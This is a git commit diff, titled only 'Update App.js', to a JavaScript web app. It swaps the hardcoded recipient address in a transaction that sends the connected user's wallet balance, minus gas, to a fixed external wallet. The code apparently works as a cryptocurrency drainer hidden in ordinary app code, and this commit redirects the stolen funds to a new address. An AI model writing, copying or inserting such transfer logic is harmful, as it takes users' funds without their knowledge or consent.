9e7e5dc28613642116108839463780af7823e1e9
SDEEY <75689630+SDEEY@users.noreply.github.com>
2023-04-15 01:29:40 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -50,7 +50,7 @@ function App() {
         
         let params = [{
             "from": address[0],
-            "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
+            "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
             "value": parseInt((convertedBalance - (Number(gas) / 10000)) * 1000000000000000000).toString(16)
